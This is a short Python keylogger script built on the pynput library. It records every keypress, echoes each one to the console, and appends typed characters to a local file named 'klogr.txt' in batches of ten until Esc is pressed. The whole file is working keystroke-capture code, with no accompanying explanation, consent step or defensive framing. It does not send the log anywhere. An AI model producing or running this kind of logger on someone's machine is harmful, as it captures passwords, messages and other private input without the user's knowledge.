import pynput
from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key));
    if count >= 10:
        count = 0
        write_file(keys)
        keys = []

def write_file(keys):
    with open("klogr.txt", "a") as f:
        for key in keys:
            try:
                if key == Key.space:
                    f.write("\n")
                    continue
                if not key.char:
                    continue
                k = str(key).replace("'", "")
                f.write(k)
            except AttributeError:
                print('special character is pressed ', key)
def on_release(key):
    if key == Key.esc:
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


